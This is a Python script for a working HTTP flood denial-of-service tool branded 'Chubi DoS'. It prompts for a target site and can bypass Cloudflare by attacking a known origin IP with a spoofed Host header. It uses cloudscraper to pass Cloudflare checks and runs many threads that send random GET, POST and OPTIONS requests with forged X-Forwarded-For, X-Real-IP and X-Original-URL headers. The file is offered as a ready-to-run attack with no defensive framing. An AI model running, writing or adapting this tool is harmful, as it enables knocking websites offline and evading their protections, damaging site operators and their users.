import threading
import cloudscraper
import random
import string
import time
import pyfiglet
from colorama import Fore, Style, init
import sys

init(autoreset=True)

# Banner
ascii_banner = pyfiglet.figlet_format("Chubi DoS", font="slant")
print(Fore.RED + ascii_banner)
print(Fore.RED + "Made By Ratichubi\n")

# User Input
original_target = input(Fore.LIGHTRED_EX + "[?] Enter target URL (e.g., https://site.com): ").strip()
if not original_target.startswith("http"):
    original_target = "http://" + original_target

cf_bypass_mode = input(Fore.LIGHTRED_EX + "[?] Bypass CF via origin IP? (y/n): ").strip().lower()

if cf_bypass_mode == "y":
    origin_ip = input(Fore.LIGHTRED_EX + "[?] Enter known origin IP (e.g., 104.21.22.123): ").strip()
    target_url = "http://" + origin_ip
else:
    target_url = original_target

try:
    THREADS = int(input(Fore.LIGHTRED_EX + "[?] Threads (e.g., 100): ").strip())
    INTERVAL = float(input(Fore.LIGHTRED_EX + "[?] Delay (e.g., 0.05): ").strip())
except:
    THREADS = 50
    INTERVAL = 0.1

print(Fore.RED + f"\n[+] Targeting: {target_url}")
if cf_bypass_mode == "y":
    print(Fore.YELLOW + f"[!] Host header will be set to: {original_target.split('//')[-1]}")

# Configs
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.85.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0)"
]
paths = ["/", "/index", "/api/data", "/home", "/products", "/search"]
http_methods = ["GET", "POST", "OPTIONS"]

def rand_str(n=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

# Attack Function
def attack():
    scraper = cloudscraper.create_scraper()
    host_header = original_target.split('//')[-1]

    while True:
        try:
            path = random.choice(paths) + "?" + rand_str(5) + "=" + rand_str(5)
            url = target_url.rstrip("/") + path
            method = random.choice(http_methods)

            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Original-URL": "/admin",
                "X-Real-IP": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "Referer": f"https://{rand_str(6)}.com",
                "Host": host_header if cf_bypass_mode == "y" else host_header,
            }

            if method == "POST":
                data = {"search": rand_str(10)}
                r = scraper.post(url, headers=headers, data=data, timeout=4)
            else:
                r = scraper.request(method, url, headers=headers, timeout=4)

            print(Fore.LIGHTRED_EX + f"[{method}] {url} => {r.status_code}")
        except Exception as e:
            print(Fore.YELLOW + f"[!] Error: {e}")
        time.sleep(INTERVAL)

# Launch Threads
for _ in range(THREADS):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

# Keep Alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(Fore.RED + "\n[!] Exiting...")
    sys.exit(0)
